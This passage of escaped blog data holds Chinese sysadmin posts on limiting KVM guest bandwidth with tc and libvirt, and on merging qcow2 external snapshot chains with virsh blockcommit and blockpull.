control\u7684\u7f29\u5199\uff0c\u5728[\u8fd9\u91cc](http://linux-ip.net/articles/Traffic-Control-HOWTO/)\u53ef\u4ee5\u627e\u5230\u6709\u5173tc\u547d\u4ee4\u7684\u5185\u5bb9\u3002\\n\\n\u5f53\u7136\u4f60\u53ef\u4ee5\u624b\u52a8\u4f7f\u7528tc\u547d\u4ee4\u6765\u5904\u7406\u8fd9\u4e9b\u4e8b\u60c5\uff0c\u6bd4\u5982\u4f7f\u7528cbq\u961f\u5217\uff0chtb\u961f\u5217\u7b49\uff0c\u90fd\u662f\u53ef\u4ee5\u5b9e\u73b0\u7684\uff0c\u7f51\u4e0a\u627e\u627e\u5e94\u8be5\u6709\u5f88\u591a\u5173\u4e8e\u8fd9\u65b9\u9762\u7684\u8d44\u6599\uff0c\\n\\n## cbq\u961f\u5217\u793a\u4f8b\\n\u6bd4\u5982\u4e0b\u9762\u5c31\u662f\u4f7f\u7528cbq\u961f\u5217\u9650\u5236src ip\u4e3a192.168.1.102\u53d1\u9001\u6570\u636e\u5305\u7684\u901f\u7387:\\n\\n### 1.\u5efa\u7acbcbq\u961f\u5217\\n```\\ntc qdisc add dev eth0 root handle 1: cbq avpkt 1000 bandwidth 100mbit\\n```\\n### 2.\u5efa\u7acb\u5e26\u5bbd\u9650\u5236\u5206\u7c7b\\n```\\ntc class add dev eth0 parent 1: classid 1:1 cbq rate 60mbit allot 1500 prio 5 bounded isolated\\ntc class add dev eth0 parent 1: classid 1:2 cbq rate 70mbit allot 1500 prio 5 bounded isolated\\ntc class add dev eth0 parent 1: classid 1:3 cbq rate 80mbit allot 1500 prio 5 bounded isolated\\n```\\n\\n### 3.\u5efa\u7acb\u8fc7\u6ee4\u5668\\n\\n\u7ed1\u5b9a\u6307\u5b9a\u5e26\u5bbd\u9650\u5236\u7c7b\u578b\u81f3\u6307\u5b9a\u865a\u62df\u673aip:\\n```\\ntc filter add dev eth0 parent 1: protocol ip prio 16 u32 match ip src 192.168.1.102 flowid 1:2\\n```\\n\\n## htb\u961f\u5217\u793a\u4f8b\\n\u6211\u4eec\u53ef\u4ee5\u5728\u6bcd\u673a\u4e0a\u7ed9vm\u5bf9\u5e94\u7684\u865a\u62df\u7f51\u5361\u589e\u52a0tc\u89c4\u5219\uff0c\u4f7f\u7528htb\u961f\u5217\uff0c\u4e00\u4e2a\u53ef\u7528\u7684\u811a\u672c\u793a\u4f8b\u5982\u4e0b\uff1a\\n\\n~~~bash\\n# add interface bandwidth limit\\n# usage: tc_add iface in_kbps out_kbps\\ntc_add() {\\n    local iface=$1\\n    local in_bw=$2\\n    local out_bw=$3\\n    local in_average=\\"${in_bw}kbps\\"\\n    local in_peak=\\"${in_bw}kbps\\"\\n    local out_average=\\"${out_bw}kbps\\"\\n    local out_peak=\\"${out_bw}kbps\\"\\n    local burst=\\"2kb\\"\\n    local mtu=1500\\n    local r2q=$((in_bw*1000/mtu-1))\\n    local tc=\\"/sbin/tc\\"\\n    [ $r2q -lt 1 ] && r2q=1\\n    if [ $in_bw != 0 ]; then\\n        $tc qdisc add dev $iface root handle 1: htb default 2 r2q $r2q\\n        $tc class add dev $iface parent 1: classid 1:1 htb rate $in_average \\\\\\n            ceil $in_peak burst $burst cburst $burst\\n        $tc class add dev $iface parent 1:1 classid 1:2 htb rate $in_average \\\\\\n            ceil $in_peak burst $burst cburst $burst\\n        $tc qdisc add dev $iface parent 1:2 handle 2: sfq perturb 10\\n        $tc filter add dev $iface parent 1:0 protocol ip handle 1 fw flowid 1\\n    fi\\n    if [ $out_bw != 0 ]; then\\n        $tc qdisc add dev $iface ingress\\n        $tc filter add dev $iface parent ffff: protocol ip u32 match ip src \\\\\\n            0.0.0.0/0 police rate $out_average burst ${out_bw}kb mtu 64kb drop \\\\\\n            flowid :1\\n    fi\\n}\\n\\n# clean up interface bandwidth limit\\n# usage: tc_del iface\\ntc_del() {\\n    local iface=$1\\n    local tc=\\"/sbin/tc\\"\\n    $tc qdisc del dev $iface root &>>/dev/null\\n    sleep 0.1\\n    $tc qdisc del dev $iface ingress &>>/dev/null\\n}\\n\\n~~~\\n\\n## libvirt\u4e2d\u7684\u5e26\u5bbd\u63a7\u5236\\n\u6211\u6bd4\u8f83\u63a8\u8350\u7684\u65b9\u6cd5\u8fd8\u662f\u76f4\u63a5\u4f7f\u7528libvirt\uff0clibvirt \u4e2d\u5df2\u7ecf\u96c6\u6210\u4e86\u5e26\u5bbd\u63a7\u5236\u7684\u529f\u80fd\uff0c\u4e0b\u9762\u662f\u5173\u4e8e\u5e26\u5bbd\u63a7\u5236\u90e8\u5206\u7684xml\u63cf\u8ff0:\\n\\n\u4f7f\u7528\u65b9\u6cd5\uff1a\u5728\u7f51\u5361interface\u4e2d\u52a0\u5165\\n~~~xml\\n<bandwidth>\\n<inbound average=\'1000\' peak=\'5000\' burst=\'1024\'/>\\n<outbound average=\'128\' peak=\'256\' burst=\'256\'/>\\n</bandwidth>\\n~~~\\n\\n\u4ee5\u4e0b\u662f\u5173\u4e8e\u5404\u9879\u53c2\u6570\u7684\u89e3\u91ca\uff0c\u83b7\u53d6\u6700\u65b0\u7684\u4fe1\u606f\u53ef\u4ee5\u53c2\u8003[libvirt\u6587\u6863](http://www.libvirt.org/).\\n\\n* mandatory attribute:\\n  * average: It specifies average bit rate on interface being shaped.\\n\\n* optional attributes:\\n  * peak: which specifies maximum rate at which interface can send data,\\n  * burst: amount of bytes that can be burst at peak speed.\\n\\nAccepted values: integer numbers.\\n\\nunits:\\n* average: kilobytes per second\\n* peak: kilobytes per second\\n* burst: kilobytes."},{"id":"/2012/11/23/libvirt-snapshot-blockcommit-blockpull","metadata":{"permalink":"/notes/blog/2012/11/23/libvirt-snapshot-blockcommit-blockpull","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2012-11-23-libvirt-snapshot-blockcommit-blockpull.md","source":"@site/blog/2012-11-23-libvirt-snapshot-blockcommit-blockpull.md","title":"\u6d45\u6790qcow2\u955c\u50cf\u6587\u4ef6\u7684\u5feb\u7167\u5408\u5e76","description":"show how to create snapshot with libvirt and qemu-img.","date":"2012-11-23T00:00:00.000Z","tags":[{"inline":true,"label":"libvirt","permalink":"/notes/blog/tags/libvirt"},{"inline":true,"label":"kvm","permalink":"/notes/blog/tags/kvm"},{"inline":true,"label":"snapshot","permalink":"/notes/blog/tags/snapshot"}],"readingTime":12.16,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"\u6d45\u6790qcow2\u955c\u50cf\u6587\u4ef6\u7684\u5feb\u7167\u5408\u5e76","description":"show how to create snapshot with libvirt and qemu-img.","categories":["virt"],"tags":["libvirt","kvm","snapshot"],"redirect_from":["/2012/11/23/"]},"unlisted":false,"prevItem":{"title":"\u4f7f\u7528libvirt\u548ctc\u5b9e\u73b0vm\u5e26\u5bbd\u63a7\u5236","permalink":"/notes/blog/2013/03/01/libvirt-tc-bandwidth-control"},"nextItem":{"title":"metasploit\u5b66\u4e60\u7b14\u8bb0","permalink":"/notes/blog/2012/11/12/msf-study-note"}},"content":"> \u8fd9\u662f\u4e00\u7bc7\u5173\u4e8esnapshots, blockpull, blockcommit\u7684\u7684\u4ecb\u7ecd.\u4f5c\u8005\u548cwith Eric Blake, Jeff Cody,Kevin Wolf\u4ee5\u53ca\u5f88\u591aIRC\u548cmailing lists\u91cc\u9762\u7684\u540c\u5b66\u5927\u91cf\u8ba8\u8bba\u4ee5\u53ca\u4f5c\u8005\u5927\u91cf\u7684\u7279\u5411\u6d4b\u8bd5\u7684\u57fa\u7840\u4e4b\u4e0a\u603b\u7ed3\u51fa\u6765\u7684\\n\\n\\n## \u57fa\u7840\u77e5\u8bc6\\n\\n\u4e00\u4e2a\u865a\u62df\u673a\u5feb\u7167\u53ef\u88ab\u770b\u4f5c\u662f\u865a\u62df\u673a\u7684\u5728\u67d0\u4e2a\u6307\u5b9a\u65f6\u95f4\u7684\u89c6\u56fe\uff08\u5305\u62ec\u4ed6\u7684\u64cd\u4f5c\u7cfb\u7edf\u548c\u6240\u6709\u7684\u7a0b\u5e8f\uff09.\u636e\u6b64\uff0c\u67d0\u53ef\u4ee5\u8fd8\u539f\u5230\u4e00\u4e2a\u4e4b\u524d\u7684\u5b8c\u6574\u7684\u72b6\u6001\uff0c\u6216\u8005\u5728guest\u8fd0\u884c\u7684\u65f6\u5019\u505a\u4e2a\u5907\u4efd.\u6240\u4ee5\uff0c\u5728\u6211\u4eec\u7ee7\u7eed\u6df1\u5165\u4e4b\u524d\u6211\u4eec\u5fc5\u987b\u641e\u61c2\u4e24\u4e2a\u540d\u8bcd\uff1abacking files\u548coverlays .\\n\\n### QCOW2 backing files \u4e0e overlays\\n\\nqcow2\uff08qemu copy-on-write\uff09\u5177\u6709\u521b\u5efa\u4e00\u4e2abase-image\uff0c\u4ee5\u53ca\u5728base-image\uff08\u5373backing file\uff09\u7684\u57fa\u7840\u4e0a\u521b\u5efa\u591a\u4e2acopy-on-write overlays\u955c\u50cf\u7684\u80fd\u529b.backing files\u548coverlays\u5341\u5206\u6709\u7528\uff0c\u53ef\u4ee5\u8fc5\u901f\u7684\u521b\u5efa\u7626\u88c5\u5907\u865a\u62df\u673a\u7684\u5b9e\u4f8b\uff0c\u7279\u522b\u662f\u5728\u5f00\u53d1\u6d4b\u8bd5\u7684\u65f6\u5019\u53ef\u4ee5\u8ba9\u4f60\u8fc5\u901f\u7684\u56de\u6eda\u5230\u4e4b\u524d\u7684\u67d0\u4e2a\u5df2\u77e5\u72b6\u6001\uff0c\u4e22\u5f03overlay.\\n\\nFigure-1\\n\\n```\\n.--------------.    .-------------.    .-------------.    .-------------.\\n|              |    |             |    |             |    |             |\\n| RootBase     |<---| Overlay-1   |<---| Overlay-1A  <--- | Overlay-1B  |\\n| (raw/qcow2)  |    | (qcow2)     |    | (qcow2)     |    | (qcow2)     |\\n\'--------------\'    \'-------------\'    \'-------------\'    \'-------------\'\\n```\\n\\n\u4e0a\u56fe\u8868\u660erootbase\u662foverlay-1\u7684backing file\uff0c\u4ee5\u6b64\u7c7b\u63a8.\\n\\nFigure-2\\n\\n```\\n.-----------.   .-----------.   .------------.  .------------.  .------------.\\n|           |   |           |   |            |  |            |  |            |\\n| RootBase  |<--- Overlay-1 |<--- Overlay-1A <--- Overlay-1B <--- Overlay-1C |\\n|           |   |           |   |            |  |            |  | (Active)   |\\n\'-----------\'   \'-----------\'   \'------------\'  \'------------\'  \'------------\'\\n   ^    ^\\n   |    |\\n   |    |       .-----------.    .------------.\\n   |    |       |           |    |            |\\n   |    \'-------| Overlay-2 |<---| Overlay-2A |\\n   |            |           |    | (Active)   |\\n   |            \'-----------\'    \'------------\'\\n   |\\n   |\\n   |            .-----------.    .------------.\\n   |            |           |    |            |\\n   \'------------| Overlay-3 |<---| Overlay-3A |\\n                |           |    | (Active)   |\\n                \'-----------\'    \'------------\'\\n```\\n\\n\u4e0a\u56fe\u8868\u660e\u6211\u4eec\u53ef\u4ee5\u53ea\u7528\u5355\u4e2abacking file\u6765\u521b\u5efa\u591a\u6761\u94fe.\\n\\n\u6ce8\u610f : backing file \u603b\u662f \u53ea\u8bfb \u6253\u5f00\u7684. \u6362\u8a00\u4e4b, \u4e00\u65e6\u65b0\u5feb\u7167\u88ab\u521b\u5efa\uff0c\u4ed6\u7684\u540e\u7aef\u6587\u4ef6\u5c31\u4e0d\u80fd\u88ab\u4fee\u6539,(\u5feb\u7167\u4f9d\u8d56\u4e8e\u540e\u7aef\u6587\u4ef6\u7684\u8fd9\u79cd\u72b6\u6001).\u4e86\u89e3\u66f4\u591a\u53c2\u89c1\u540e\u9762\u7684(\'blockcommit\' \u8282) .\\n\\n\u793a\u4f8b :\\n\\n```\\n[FedoraBase.img] ----- <- [Fed-guest-1.qcow2] <- [Fed-w-updates.qcow2] <- [Fedora-guest-with-updates-1A]\\n                 \\\\\\n                  \\\\--- <- [Fed-guest-2.qcow2] <- [Fed-w-updates.qcow2] <- [Fedora-guest-with-updates-2A]\\n```\\n\\n\uff08\u6ce8\u610f\u7bad\u5934\u7684\u65b9\u5411\uff0cFed-w-updates.qcow2 \u7684backing file\u662f Fed-guest-1.qcow2\uff09\\n\\n\u4e0a\u9762\u7684\u793a\u4f8b\u4e2d\u53ef\u4ee5\u770b\u5230 FedoraBase.img \u5b89\u88c5\u4e86\u4e00\u4e2afedora17\u7cfb\u7edf\uff0c\u5e76\u4f5c\u4e3a\u6211\u4eec\u7684backing file.\u73b0\u5728\u8fd9\u4e2abacking file\u5c06\u4f5c\u4e3a\u6a21\u677f\u5feb\u901f\u7684\u521b\u5efa\u4e24\u4e2a\u7626\u88c5\u5907\u5b9e\u4f8b\uff0c\u548c Figure-2 \u9053\u7406\u662f\u4e00\u6837\u7684.\\n\\n## \u5177\u4f53\u64cd\u4f5c\\n\u4f7f\u7528qemu-img\u4e3a\u5355\u4e2abacking file\u6765\u521b\u5efa\u4e24\u4e2afedora\u7684\u7626\u88c5\u5907\u514b\u9686:\\n\\n```\\n# qemu-img create -b /export/vmimages/RootBase.img -f qcow2 \\\\\\n  /export/vmimages/Fedora-guest-1.qcow2\\n\\n# qemu-img create -b /export/vmimages/RootBase.img -f qcow2 \\\\\\n  /export/vmimages/Fedora-guest-2.qcow2\\n```\\n\\n\u73b0\u5728\uff0c\u4e0a\u9762\u521b\u5efa\u51fa\u6765\u7684\u4e24\u4e2a\u955c\u50cf Fedora-guest-1 & Fedora-guest-2 \u90fd\u53ef\u4ee5\u7528\u6765\u542f\u52a8\u4e00\u4e2a\u865a\u62df\u673a\uff0c\u7ee7\u7eed\u6211\u4eec\u7684\u793a\u4f8b\uff0c\u73b0\u5728\u6211\u4eec\u9700\u8981\u521b\u5efa\u4e00\u4e2af17\u7684\u5b9e\u4f8b\uff0c\u4f46\u662f\u8fd9\u6b21\u6211\u4eec\u9700\u8981\u521b\u5efa\u7684\u662f\u5177\u6709\u5b8c\u6574\u7684\u66f4\u65b0\u7684\u5b9e\u4f8b\uff0c\u8fd9\u65f6\u53ef\u4ee5\u521b\u5efa\u53e6\u5916\u4e00\u4e2aoverlay\uff08Fedora-guest-with-updates-1A\uff09\u800c\u8fd9\u4e2aoverlay\u7684backing file\u662f\'Fed-w-updates.qcow2\'\uff08\u4e00\u4e2a\u5305\u542b\u4e86\u5b8c\u6574\u66f4\u65b0\u7684\u955c\u50cf\uff09:\\n\\n```\\n# qemu-img create -b /export/vmimages/Fed-w-updates.qcow2 -f qcow2 \\\\\\n   /export/vmimages/Fedora-guest-with-updates-1A.qcow2\\n```\\n\\n\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528qemu-img\u547d\u4ee4\u6765\u67e5\u770b\u955c\u50cf\u7684\u4fe1\u606f\uff0c\u5305\u62ec\u865a\u62df\u78c1\u76d8\u5927\u5c0f\uff0c\u4f7f\u7528\u5927\u5c0f\uff0cbacking file\u6307\u5411:\\n\\n```\\n# qemu-img info /export/vmimages/Fedora-guest-with-updates-1A.qcow2\\n```\\n\\n\u6ce8\u610f: \u6700\u65b0\u7248\u672c\u7684qemu-img\u53ef\u4ee5\u9012\u5f52\u67e5\u8be2\u5230\u6574\u6761\u5b8c\u6574\u7684\u94fe:\\n\\n```\\n# qemu-img info --backing-chain /export/vmimages/Fedora-guest-with-updates-1A.qcow2\\n```\\n\\n\u540d\u8bcd\u89e3\u91caSnapshot:\\n\\n* \u5185\u7f6e\u5feb\u7167\uff08Internal Snapshots\uff09 -- \u5355\u4e2aqcow2\u955c\u50cf\u6587\u4ef6\u5b58\u50a8\u4e86\u5305\u62ec\u6570\u636e\u4ee5\u53ca\u5feb\u7167\u7684\u72b6\u6001\u4fe1\u606f\uff0c\\n\\n\u5185\u7f6e\u5feb\u7167\u53c8\u53ef\u4ee5\u7ec6\u5206\u4e00\u4e0b:-\\n\\n  * \u5185\u7f6e\u78c1\u76d8\u5feb\u7167\uff08Internal disk snapshot\uff09:\\n\\n  * \u5feb\u7167\u70b9\u7684\u78c1\u76d8\u72b6\u6001\uff0c\u6570\u636e\u548c\u5feb\u7167\u4fdd\u5b58\u5728\u5355\u4e2aqcow2\u6587\u4ef6\u4e2d\uff0c\u865a\u62df\u673a\u8fd0\u884c\u72b6\u6001\u548c\u5173\u95ed\u72b6\u6001\u90fd\u53ef\u4ee5\u521b\u5efa.\\n\\nLibvirt \u4f7f\u7528 \'qemu-img\' \u547d\u4ee4\u521b\u5efa\u5173\u673a\u72b6\u6001\u7684\u78c1\u76d8\u5feb\u7167.Libvirt \u4f7f\u7528 \'savevm\' \u547d\u4ee4\u521b\u5efa\u8fd0\u884c\u72b6\u6001\u7684\u78c1\u76d8\u5feb\u7167.\\n\\n* \u5185\u7f6e\u7cfb\u7edf\u8fd8\u539f\u70b9\uff08Internal system checkpoint\uff09:\\n\\n\u5185\u5b58\u72b6\u6001\uff0c\u8bbe\u5907\u72b6\u6001\u548c\u78c1\u76d8\u72b6\u6001\uff0c\u53ef\u4ee5\u4e3a\u8fd0\u884c\u4e2d\u7684\u865a\u62df\u673a\u521b\u5efa\uff0c\u6240\u6709\u4fe1\u606f\u90fd\u5b58\u50a8\u5728\u540c\u4e00\u4e2aqcow2\u6587\u4ef6\u4e2d\uff0c\u53ea\u6709\u5728\u8fd0\u884c\u72b6\u6001\u624d\u80fd\u521b\u5efa\u5185\u7f6e\u7cfb\u7edf\u8fd8\u539f\u70b9.\\n\\nLibvirt \u4f7f\u7528\'savevm\' \u547d\u4ee4\u6765\u521b\u5efa\u8fd9\u79cd\u5feb\u7167\\n\\n* \u5916\u7f6e\u5feb\u7167\uff08External Snapshots\uff09 -- \u5f53\u4e00\u4e2a\u5feb\u7167\u88ab\u521b\u5efa\u65f6\uff0c\u521b\u5efa\u65f6\u5f53\u524d\u7684\u72b6\u6001\u4fdd\u5b58\u5728\u5f53\u524d\u4f7f\u7528\u7684\u78c1\u76d8\u6587\u4ef6\u4e2d\uff0c\u5373\u6210\u4e3a\u4e00\u4e2abacking file.\u6b64\u65f6\u4e00\u4e2a\u65b0\u7684overlay\u88ab\u521b\u5efa\u51fa\u6765\u4fdd\u5b58\u5f80\u540e\u7684\u6570\u636e.\\n\\n\u8fd9\u4e2a\u4e5f\u53ef\u4ee5\u7ec6\u5206\u4e00\u4e0b:-\\n\\n  * \u5916\u7f6e\u78c1\u76d8\u5feb\u7167\uff08External disk snapshot\uff09: \u78c1\u76d8\u7684\u5feb\u7167\u88ab\u4fdd\u5b58\u5728\u4e00\u4e2a\u6587\u4ef6\u4e2d\uff0c\u521b\u5efa\u65f6\u95f4\u70b9\u4ee5\u540e\u7684\u6570\u636e\u88ab\u8bb0\u5f55\u5230\u4e00\u4e2a\u65b0\u7684qcow2\u6587\u4ef6\u4e2d.\u540c\u6837\u53ef\u4ee5\u5728\u8fd0\u884c\u548c\u5173\u95ed\u72b6\u6001\u521b\u5efa.\\n\\nLibvirt \u4f7f\u7528 \'transaction\' \u547d\u4ee4\u6765\u4e3a\u8fd0\u884c\u72b6\u6001\u521b\u5efa\u8fd9\u79cd\u5feb\u7167.\\nLibvirt \u4f7f\u7528\'qemu-img\' \u547d\u4ee4\u4e3a\u5173\u95ed\u72b6\u6001\u521b\u5efa\u8fd9\u79cd\u5feb\u7167(\u622a\u6b62\u76ee\u524d\u529f\u80fd\u8fd8\u5728\u5f00\u53d1\u4e2d).\\n  * \u5916\u7f6e\u7cfb\u7edf\u8fd8\u539f\u70b9\uff08External system checkpoint\uff09:\\n\\n\u865a\u62df\u673a\u7684\u78c1\u76d8\u72b6\u6001\u5c06\u88ab\u4fdd\u5b58\u5230\u4e00\u4e2a\u6587\u4ef6\u4e2d\uff0c\u5185\u5b58\u548c\u8bbe\u5907\u7684\u72b6\u6001\u5c06\u88ab\u4fdd\u5b58\u5230\u53e6\u5916\u4e00\u4e2a\u65b0\u7684\u6587\u4ef6\u4e2d\uff0c\\n\\n\uff08\u8fd9\u4e2a\u529f\u80fd\u4e5f\u8fd8\u5728\u5f00\u53d1\u4e2d\uff09.\\n\\nVM\u72b6\u6001\uff08VM state\uff09:\\n\\n\u4fdd\u5b58\u8fd0\u884c\u72b6\u6001\u865a\u62df\u673a\u7684\u5185\u5b58\u8bbe\u5907\u72b6\u6001\u4fe1\u606f\u81f3\u6587\u4ef6\uff0c\u53ef\u4ee5\u901a\u8fc7\u6b64\u6587\u4ef6\u6062\u590d\u5230\u4fdd\u5b58\u65f6\u7684\u72b6\u6001\uff0c\u6709\u70b9\u7c7b\u4f3c\u7cfb\u7edf\u7684\u4f11\u7720.\uff08\u6ce8\u610f\u521b\u5efaVM\u72b6\u6001\u4fdd\u5b58\u7684\u65f6\u5019VM\u78c1\u76d8\u5fc5\u987b\u662f\u672a\u53d1\u751f\u5199\u5165\u6539\u52a8\u7684\uff09\\n\\nLibvirt\u4f7f\u7528 \'migrate\' (to file)\u547d\u4ee4\u6765\u5b8c\u6210VM\u72b6\u6001\u8f6c\u50a8.\\n\\n## \u521b\u5efa\u5feb\u7167\\n\\n\u6bcf\u6b21\u4ea7\u751f\u4e00\u4e2a\u5916\u7f6esnapshot\uff0c\u4e00\u4e2a /new/ overlay \u955c\u50cf\u5c31\u4f1a\u968f\u4e4b\u751f\u6210\uff0c\u800c\u524d\u4e00\u4e2a\u955c\u50cf\u5c31\u53d8\u6210\u4e86\u4e00\u4e2a\u5feb\u7167.\\n\\ndiskonly\u5185\u7f6e\u5feb\u7167\u521b\u5efa\\n\\n\u5047\u5982\u9700\u8981\u4e3a\u540d\u4e3a\'f17vm1\'\u7684\u865a\u62df\u673a\u521b\u5efa\u4e00\u4e2a\u8fd0\u884c\u6001\u6216\u5173\u95ed\u6001\u7684\u5185\u7f6e\u5feb\u7167snap1\\n\\n```\\n# virsh snapshot-create-as f17vm1  snap1 snap1-desc\\n```\\n\u5217\u51fa\u5feb\u7167\u5217\u8868\uff0c\u4f7f\u7528*qemu-img*\u67e5\u770binfo\\n\\n```\\n# virsh snapshot-list f17vm1\\n# qemu-img info /home/kashyap/vmimages/f17vm1.qcow2\\n```\\n\\ndisk-only\u5916\u7f6e\u5feb\u7167\u521b\u5efa :\\n\\n\u67e5\u770b\u865a\u62df\u673a\u78c1\u76d8\u5217\u8868\\n\\n```\\n# virsh domblklist f17-base\\nTarget     Source\\n---------------------------------------------\\nvda        /export/vmimages/f17-base.qcow2\\n\\n```\\n\u521b\u5efa\u5916\u7f6edisk-only\u78c1\u76d8\u5feb\u7167\uff08VM*\u8fd0\u884c\u6001*\uff09:\\n\\n```\\n# virsh snapshot-create-as --domain f17-base snap1 snap1-desc \\\\\\n--disk-only --diskspec vda,snapshot=external,file=/export/vmimages/sn1-of-f17-base.qcow2 \\\\\\n--atomic\\nDomain snapshot snap1 created\\n```\\n\\n    * \u4e00\u65e6\u4e0a\u9762\u7684\u547d\u4ee4\u88ab\u6267\u884c\uff0c\u5219\u539f\u6765\u7684\u955c\u50cff17-base\u5c06\u53d8\u4e3abacking file\uff0c\u4e00\u4e2a\u65b0\u7684\u955c\u50cf\u88ab\u521b\u5efa.\\n\\n\u73b0\u5728\u518d\u5217\u8868\u67e5\u770b\u865a\u62df\u673a\u78c1\u76d8\uff0c\u4f60\u4f1a\u53d1\u73b0\u65b0\u4ea7\u751f\u7684\u955c\u50cf\u5df2\u7ecf\u6295\u5165\u4f7f\u7528.\\n\\n```\\n# virsh domblklist f17-base\\nTarget     Source\\n----------------------------------------------------\\nvda        /export/vmimages/sn1-of-f17-base.qcow2\\n\\n```\\n\\n\u5feb\u7167\u56de\u6eda\\n\\n\u622a\u6b62\u5199\u6b64\u6587\u4e4b\u65f6\uff0c\u56de\u6eda\u81f3\'\u5185\u7f6e\u5feb\u7167\'(system checkpoint\u6216disk-only)\u662f\u53ef\u4ee5\u4f7f\u7528\u7684.\\n\\n\u865a\u62df\u673af17vm1\u56de\u6eda\u81f3\u5feb\u7167\'snap1\'\\n\\n```\\n# virsh snapshot-revert --domain f17vm1 snap1\\n```\\n\\n\u4f7f\u7528 snapshot-revert \u56de\u6eda \'\u5916\u7f6e\u78c1\u76d8\u5feb\u7167\' \u7a0d\u5fae\u590d\u6742\u4e9b\uff0c\u9700\u8981\u6d89\u53ca\u5230\u7a0d\u5fae\u590d\u6742\u70b9\u7684\u95ee\u9898\uff0c\u9700\u8981\u8003\u8651\u7684\u662f\u5408\u5e76\'base\'\u81f3\'top\'\u8fd8\u662f\u5408\u5e76\'top\'\u81f3\'base\'.\u4e5f\u5c31\u662f\u8bf4\uff0c\u6709\u4e24\u79cd\u65b9\u5f0f\u53ef\u4ee5\u9009\u62e9\uff0c\u5916\u7f6e\u78c1\u76d8\u5feb\u7167\u94fe\u7684\u7f29\u77ed\u53ef\u4ee5\u4f7f\u7528 blockpull \u6216 blockcommit .\u622a\u6b62\u76ee\u524d\u4e0a\u6e38\u793e\u533a\u4ecd\u7136\u5728\u52aa\u529b\u5b8c\u5584\u8fd9\u9879\u529f\u80fd.\\n\\n## \u5408\u5e76\u5feb\u7167\u6587\u4ef6\\n\\n\u5916\u7f6e\u5feb\u7167\u975e\u5e38\u6709\u7528\uff0c\u4f46\u8fd9\u91cc\u6709\u4e00\u4e2a\u95ee\u9898\u5c31\u662f\u5982\u4f55\u5408\u5e76\u5feb\u7167\u6587\u4ef6\u6765\u7f29\u77ed\u94fe\u7684\u957f\u5ea6\uff0c\u5982\u4e0a\u6240\u8ff0\u8fd9\u91cc\\n\\n\u6709\u4e24\u79cd\u65b9\u5f0f:\\n\\n* blockcommit: \u4ece top \u5408\u5e76\u6570\u636e\u5230 base (\u5373\u5408\u5e76overlays\u81f3backing files).\\n* blockpull: \u5c06backing file\u6570\u636e\u5408\u5e76\u81f3overlay\u4e2d.\u4ece base \u5230 top .\\n\\n### blockcommit\\n\\nblockcommit\u53ef\u4ee5\u8ba9\u4f60\u5c06\'top\'\u955c\u50cf(\u5728\u540c\u4e00\u6761backing file\u94fe\u4e2d)\u5408\u5e76\u81f3\u5e95\u5c42\u7684\'base\'\u955c\u50cf.\u4e00\u65e6 blockcommit \u6267\u884c\u5b8c\u6210\uff0c\u5904\u4e8e\u6700\u4e0a\u9762\u7684overlay\u94fe\u5173\u7cfb\u5c06\u88ab\u6307\u5411\u5230\u5e95\u5c42\u7684overlay\u6216base.\u8fd9\u5728\u521b\u5efa\u4e86\u5f88\u957f\u4e00\u6761\u94fe\u4e4b\u540e\u7528\u6765\u7f29\u77ed\u94fe\u957f\u5ea6\u7684\u65f6\u5019\u5341\u5206\u6709\u7528.\\n\\n\u4e0b\u9762\u6765\u4e2a\u56fe\u8bf4\u660e\u4e0b:\\n\\n\u6211\u4eec\u73b0\u5728\u6709\u4e00\u4e2a\u955c\u50cf\u53eb\'RootBase\'\uff0c\u62e5\u67094\u4e2a\u5916\u7f6e\u5feb\u7167\uff0c\'Active\'\u4e3a\u5f53\u524dVM\u5199\u5165\u6570\u636e\u7684\uff0c\\n\\n\u4f7f\u7528\'blockcommit\'\u53ef\u4ee5\u6709\u4ee5\u4e0b\u591a\u79cdcase :\\n\\n\u5408\u5e76Snap-1, Snap-2 and Snap-3 \u81f3 \'RootBase\'\\n\u53ea\u5408\u5e76Snap-1 and Snap-2 \u81f3 RootBase\\n\u53ea\u5408\u5e76Snap-1 \u81f3 RootBase\\n\u5408\u5e76Snap-2 \u81f3 Snap-1\\n\u5408\u5e76Snap-3 \u81f3 Snap-2\\n\u5408\u5e76Snap-2 \u548c Snap-3 \u81f3 Snap-1\\n\u6ce8: \u5408\u5e76\'Active\'\u5c42(\u6700\u9876\u90e8\u7684overlay)\u81f3backing_files\u7684\u529f\u80fd\u8fd8\u5728\u5f00\u53d1\u4e2d.\\n\\n(\u4e0b\u56fe\u89e3\u91cacase (6))\\n\\nFigure-3\\n\\n```\\n.------------.  .------------.  .------------.  .------------.  .------------.\\n|            |  |            |  |            |  |            |  |            |\\n| RootBase   <---  Snap-1    <---  Snap-2    <---  Snap-3    <---  Snap-4    |\\n|            |  |            |  |            |  |            |  | (Active)   |\\n\'------------\'  \'------------\'  \'------------\'  \'------------\'  \'------------\'\\n                                 /                  |\\n                                /                   |\\n                               /  commit data       |\\n                              /                     |\\n                             /                      |\\n                            /                       |\\n                           v           commit data  |\\n.------------.  .------------. <--------------------\'           .------------.\\n|            |  |            |                                  |            |\\n| RootBase   <---  Snap-1    |<---------------------------------|  Snap-4    |\\n|            |  |            |       Backing File               | (Active)   |\\n\'------------\'  \'------------\'                                  \'------------\'\\n```\\n\\n\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u6709\u4ee5\u4e0b\u573a\u666f\uff1a\\n\\n\u5f53\u524d: ```[base] <- sn1 <- sn2 <- sn3 <- sn4(this is active)```\\n\\n\u76ee\u6807: ```[base] <- sn1 <- sn4 (\u5982\u6b64\u6765\u4e22\u5f03sn2,sn3)```\\n\\n  \u4e0b\u9762\u6709\u4e24\u79cd\u65b9\u5f0f\uff0cmethod-a\u66f4\u5feb,method-b \u6162\u4e9b\uff0c\u4f46\u662fsn2\u6709\u6548\u53ef\u7528. (VM\u8fd0\u884c\u6001).\\n\\n            (method-a):\\n\\n```\\n           # virsh blockcommit --domain f17 vda --base /export/vmimages/sn1.qcow2  \\\\\\n\\n               --top /export/vmimages/sn3.qcow2 --wait --verbose\\n```\\n[OR]\\n            (method-b):\\n```\\n# virsh blockcommit --domain f17 vda  --base /export/vmimages/sn2.qcow2  \\\\\\n    --top /export/vmimages/sn3.qcow2 --wait --verbose\\n# virsh blockcommit --domain f17 vda  --base /export/vmimages/sn1.qcow2  \\\\\\n    --top /export/vmimages/sn2.qcow2 --wait --verbose\\n```\\n\\n\u6ce8: 